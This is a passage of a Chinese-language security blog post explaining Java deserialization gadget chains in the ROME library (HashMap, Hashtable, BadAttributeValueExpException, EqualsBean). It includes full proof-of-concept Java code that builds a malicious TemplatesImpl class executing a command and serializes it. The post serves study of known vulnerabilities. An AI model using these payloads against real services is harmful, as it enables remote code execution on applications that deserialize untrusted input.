class_">HashMap</span>();</span><br><span class="line">            <span class="type">String</span> <span class="variable">place_holder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;KC1zs4&quot;</span>); <span class="comment">// 使用反射进行设置</span></span><br><span class="line">            <span class="type">ObjectBean</span> <span class="variable">obj_ObjectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(String.class, place_holder);</span><br><span class="line">            triggeredObj.put(obj_ObjectBean,<span class="string">&quot;KC1zs4&quot;</span>);</span><br><span class="line">            setFieldValue(obj_ObjectBean, <span class="string">&quot;_equalsBean&quot;</span>, <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, payload_obj)));</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 3. 序列化与反序列化 * * * * * */</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">            oos.writeObject(triggeredObj);</span><br><span class="line">            oos.close();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 本地测试触发</span></span><br><span class="line">            System.out.println(baos);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray()));</span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(obj, value);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="HashTable利用链"><a href="#HashTable利用链" class="headerlink" title="HashTable利用链"></a>HashTable利用链</h2><h3 id="HashTable-Gadget-CC7-但是不用CC库"><a href="#HashTable-Gadget-CC7-但是不用CC库" class="headerlink" title="HashTable Gadget: CC7 + ?(但是不用CC库)"></a>HashTable Gadget: CC7 + ?(但是不用CC库)</h3><ol>
+<li>触发点sink其实也是一样的，通过hash()来触发到ObjectBean.hashCode()，只不过这里使用的是HashTable</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HashTable.readObject(ObjectInputStream)</span><br><span class="line">HashTable.reconstitutionPut()</span><br><span class="line">ObjetBean.hashCode()</span><br><span class="line">EqualsBean.hashCode()</span><br><span class="line">EqualsBean.beanHashCode()</span><br><span class="line">ToStringBean.toString()</span><br><span class="line">ToStringBean.toString(String)</span><br><span class="line">TemplatesImpl.getOutputProperties()</span><br></pre></td></tr></table></figure>
+
+<h3 id="HashTable-reconstitutionPut"><a href="#HashTable-reconstitutionPut" class="headerlink" title="HashTable.reconstitutionPut()"></a>HashTable.reconstitutionPut()</h3><ol>
+<li><p>查看源码可以知道Hashtable再readObject中会调用<code>reconsititutuionPut(..)</code>，在其中会调用到hash()再到obj.hashCode()</p>
+ <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">    <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K)s.readObject();</span><br><span class="line">    <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V)s.readObject();</span><br><span class="line">    <span class="comment">// synch could be eliminated for performance</span></span><br><span class="line">    reconstitutionPut(table, key, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reconstitutionPut</span><span class="params">(Entry&lt;K,V&gt;[] tab, K key, V value)</span></span><br><span class="line">    <span class="keyword">throws</span> StreamCorruptedException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">    <span class="comment">// This should not happen in deserialized version.</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> hash(key);</span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;K,V&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Creates the new entry.</span></span><br><span class="line">    Entry&lt;K,V&gt; e = tab[index];</span><br><span class="line">    tab[index] = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(hash, key, value, e);</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="Hashtable-poc"><a href="#Hashtable-poc" class="headerlink" title="Hashtable poc"></a>Hashtable poc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rome;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HashTableExp</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        String AbstractTranslet=<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br><span class="line">        String TemplatesImpl=<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建恶意类</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        classPool.appendClassPath(AbstractTranslet);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;Evil&quot;</span>);  <span class="comment">// 直接创建恶意类</span></span><br><span class="line">        ctClass.setSuperclass(classPool.get(AbstractTranslet));</span><br><span class="line">        ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建TemplatesImpl对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">templateImpl</span> <span class="operator">=</span> Class.forName(TemplatesImpl).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;).newInstance();</span><br><span class="line">        setFiled(templateImpl, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFiled(templateImpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        setFiled(templateImpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建ToStringBean对象</span></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templateImpl);</span><br><span class="line">        <span class="comment">// 创建ObjectBean对象</span></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line">        setFiled(objectBean,<span class="string">&quot;_toStringBean&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFiled(objectBean, <span class="string">&quot;_cloneableBean&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建HashTable</span></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(objectBean, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;HashTable.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(hashtable);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;HashTable.bin&quot;</span>));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFiled</span><span class="params">(Object o, String fieldname, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> o.getClass().getDeclaredField(fieldname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(o, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="BadAttributeValueExpException利用链"><a href="#BadAttributeValueExpException利用链" class="headerlink" title="BadAttributeValueExpException利用链"></a>BadAttributeValueExpException利用链</h2><h3 id="Gadget-没有ObjectBean了-体量小一点"><a href="#Gadget-没有ObjectBean了-体量小一点" class="headerlink" title="Gadget: 没有ObjectBean了(体量小一点)"></a>Gadget: 没有ObjectBean了(体量小一点)</h3><blockquote>
+<p>就先不放exp了，最后CC链总结的时候会给出片段，然后可以直接获取这样<br>已经变成裁缝了(</p>
+</blockquote>
+<ol>
+<li><p>链子如下</p>
+ <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 复现版本 jdk8u66 // jdk7u21中的BadAttr..没有对应的readObject()</span></span><br><span class="line">BadAttributeValueExpException.readObject()</span><br><span class="line">ToStringBean.toString()</span><br><span class="line">ToStringBean.toString(String)</span><br><span class="line">TemplatesImpl.getOutputProperties()</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="BadAttributeValueExpException-readObject"><a href="#BadAttributeValueExpException-readObject" class="headerlink" title="BadAttributeValueExpException.readObject()"></a>BadAttributeValueExpException.readObject()</h3><ol>
+<li><p>source和sink</p>
+ <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">    <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">        val = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        val= valObj;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">        val = valObj.toString();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">        val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="EqualsBean利用链"><a href="#EqualsBean利用链" class="headerlink" title="EqualsBean利用链"></a>EqualsBean利用链</h2><h3 id="EqualsBean-Gadget"><a href="#EqualsBean-Gadget" class="headerlink" title="EqualsBean Gadget"></a>EqualsBean Gadget</h3><ol>
+<li>依旧是一条”原生链”(除了rome外)</li>
+<li>这里依旧忽略poc，裁缝一下就ok了</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HashSet.readObject()</span><br><span class="line">HashMap.put()</span><br><span class="line">HashMap.putVal()</span><br><span class="line">AbstractMap.equals()</span><br><span class="line">EqualsBean.equals()</span><br><span class="line">EqualsBean.beanEquals()</span><br><span class="line">TemplatesImpl.getOutputProperties()</span><br></pre></td></tr></table></figure>
+
+<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol>
+<li>ysoserial源码</li>
+<li>信工所大佬</li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13286?time__1311=GqmxuD0DnD9D2DUx05bK=ePAIhkGCWfCeD">比较全</a><ol>
+<li>其中还有两个利用方法(第7和第8)之前没有学过的，有空再来看看</li>
+</ol>
+</li>
+</ol>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%95%E5%85%A5%E4%B8%8E%E7%89%88%E6%9C%AC%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.</span> <span class="toc-text">引入与版本条件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HashMap%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number"></span> <span class="toc-text">HashMap利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HashMap-Gadget-CB1"><span class="toc-number">1.</span> <span class="toc-text">HashMap Gadget: ?+CB1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E7%82%B9-ToStringBean-toString-String"><span class="toc-number">2.</span> <span class="toc-text">敏感点: ToStringBean.toString(String)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ObjectBean"><span class="toc-number">3.</span> <span class="toc-text">ObjectBean</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HashMap-poc"><span class="toc-number">4.</span> <span class="toc-text">HashMap poc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HashTable%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number"></span> <span class="toc-text">HashTable利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HashTable-Gadget-CC7-%E4%BD%86%E6%98%AF%E4%B8%8D%E7%94%A8CC%E5%BA%93"><span class="toc-number">1.</span> <span class="toc-text">HashTable Gadget: CC7 + ?(但是不用CC库)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HashTable-reconstitutionPut"><span class="toc-number">2.</span> <span class="toc-text">HashTable.reconstitutionPut()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hashtable-poc"><span class="toc-number">3.</span> <span class="toc-text">Hashtable poc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BadAttributeValueExpException%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number"></span> <span class="toc-text">BadAttributeValueExpException利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Gadget-%E6%B2%A1%E6%9C%89ObjectBean%E4%BA%86-%E4%BD%93%E9%87%8F%E5%B0%8F%E4%B8%80%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">Gadget: 没有ObjectBean了(体量小一点)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BadAttributeValueExpException-readObject"><span class="toc-number">2.</span> <span class="toc-text">BadAttributeValueExpException.readObject()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EqualsBean%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number"></span> <span class="toc-text">EqualsBean利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EqualsBean-Gadget"><span class="toc-number">1.</span> <span class="toc-text">EqualsBean Gadget</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ref"><span class="toc-number"></span> <span class="toc-text">Ref</span></a>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kc1zs4.github.io/2024/11/24/Java%E5%AE%89%E5%85%A85(14)_rome/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kc1zs4.github.io/2024/11/24/Java%E5%AE%89%E5%85%A85(14)_rome/&text=Java安全5(14)_rome"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kc1zs4.github.io/2024/11/24/Java%E5%AE%89%E5%85%A85(14)_rome/&title=Java安全5(14)_rome"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kc1zs4.github.io/2024/11/24/Java%E5%AE%89%E5%85%A85(14)_rome/&is_video=false&description=Java安全5(14)_rome"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java安全5(14)_rome&body=Check out this article: https://kc1zs4.github.io/2024/11/24/Java%E5%AE%89%E5%85%A85(14)_rome/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kc1zs4.github.io/2024/11/24/Java%E5%AE%89%E5%85%A85(14)_rome/&title=Java安全5(14)_rome"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kc1zs4.github.io/2024/11/24/Java%E5%AE%89%E5%85%A85(14)_rome/&title=Java安全5(14)_rome"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kc1zs4.github.io/2024/11/24/Java%E5%AE%89%E5%85%A85(14)_rome/&title=Java安全5(14)_rome"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kc1zs4.github.io/2024/11/24/Java%E5%AE%89%E5%85%A85(14)_rome/&title=Java安全5(14)_rome"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kc1zs4.github.io/2024/11/24/Java%E5%AE%89%E5%85%A85(14)_rome/&name=Java安全5(14)_rome&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kc1zs4.github.io/2024/11/24/Java%E5%AE%89%E5%85%A85(14)_rome/&t=Java安全5(14)_rome"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2025
+    KC1zs4&#39;s Blog
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+  
+<script src="/js/search.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+
+    var $inputArea = $("input#search-input");
+    var $resultArea = document.querySelector("div#search-result");
+
+    $inputArea.focus(function() {
+      var search_path = "search.xml";
+      if (search_path.length == 0) {
+        search_path = "search.xml";
+      }
+      var path = "/" + search_path;
+      searchFunc(path, 'search-input', 'search-result');
+    });
+
+    $inputArea.keydown(function(e) {
+      if (e.which == 13) {
+        e.preventDefault();
+      }
+    });
+
+    var observer = new MutationObserver(function(mutationsList, observer) {
+      if (mutationsList.length == 1) {
+        if (mutationsList[0].addedNodes.length) {
+          $(".search-no-result").hide();
+        } else if (mutationsList[0].removedNodes.length) {
+          $(".search-no-result").show(200);
+        }
+      }
+    });
+
+    observer.observe($resultArea, { childList: true });
+
+  });
+  </script>
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'kc1zs4-github-io';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
